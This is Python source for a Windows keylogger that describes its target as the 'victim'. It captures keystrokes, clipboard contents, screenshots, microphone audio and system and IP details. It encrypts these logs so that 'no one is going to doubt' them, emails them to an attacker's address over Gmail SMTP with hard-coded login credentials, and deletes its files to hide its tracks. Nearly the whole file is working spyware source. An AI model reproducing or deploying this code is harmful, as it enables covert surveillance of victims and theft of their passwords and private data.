# This is the keylogger.py file which will be used to run the keylogger to the current machines
# Author: Aman Kumar

# Libraries that are used in this project

# These libraries will be used to do the email operations which will send the keystrokes of the victim to the base
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# These are the libraries that is used for the purpose of the collecting the system informations
import socket
import platform
import win32clipboard

# This is the main library that will basically have the control on the input buffer and it will read for the inputs that are provided by the keyboard
from pynput.keyboard import Key, Listener

# These libraries will be used to have the contol over the time and the operating systems
import time
import os

# For recording with the audio file and the audios we will use the scipy and sounddevice library
from scipy.io.wavfile import write
import sounddevice as sd

# This is basically used for the purpose of the cryptography these will basically encrypt the key strokes that the user will click
from cryptography.fernet import Fernet

# For getting the username and the password we will use this library
import getpass

# For doing the requests like get and post we will use the request library and use the get module from that library
from requests import get

# For the purpose of the multiprocessing we will use the process and freeze support from the multiprocessing library
from multiprocessing import Process, freeze_support

#For Taking the images as snaps we will use the imagegrab modulule from the pillow library
from PIL import ImageGrab


# These are the global informations that will be used for storing the files

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = "firebullaman@gmail.com" # Enter temproary email address here which will be used to log in in your victim computer
password = "aman@6910"      # Enter temproray email password here

username = getpass.getuser()

toaddr = "2amankumar001@gmail.com" # Enter the email address you want to send your information to.This will be the email address of the base sysytem

key = "YAO1nYWZKjPzDpJb0mJtpnfU2L2vluxOm0ltYMhr2DM="    # Generate an encryption key from the Cryptography folder

file_path = "D:\Projects\Keylogger_files"   # Enter the file path you want your files to be saved to
extend = "\\"     # This is used to make the fully qualified file path
file_merge = file_path + extend

# This is the email control function that will control the mailing operations of the keylogger that is generated
# This function basically implements the MIME library
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)

# This function is used to get the computer information
# The computer information includes:
    # The processor information
    # Operating system name and information
    # Private ip address
    # Public ip address using the ipfy api call but this can only be done thrice
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

# This function is used to get the clipboard contents
# We use win32clipboard library for this purpose

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

# This function is used to get the microphone and do the recording from the microphone
    # For this we use scipy and soundtrack library

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# This function gets the screenshots from the current screen which is focused
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

# These are the iteration control variable which will help to iterate the processes.
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

#These lines act as the timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

# This function writes the key that is recorded on a file
    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

# This function helps to exit the keylogger

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# We use the cryptography to encrypt files and hence the encrypted files will contain some of the random data and hence no one is going to doubt

files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

# Clean up our tracks and delete files
# Deleting all the files so that no trace is left behind
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)

